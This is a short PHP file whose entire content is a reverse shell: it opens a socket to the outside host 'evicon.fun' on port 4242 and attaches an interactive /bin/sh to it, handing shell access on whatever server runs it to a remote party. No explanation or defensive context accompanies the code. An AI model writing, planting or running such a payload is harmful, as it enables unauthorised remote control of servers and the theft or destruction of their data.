<?php
$sock=fsockopen("evicon.fun",4242);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);

?>
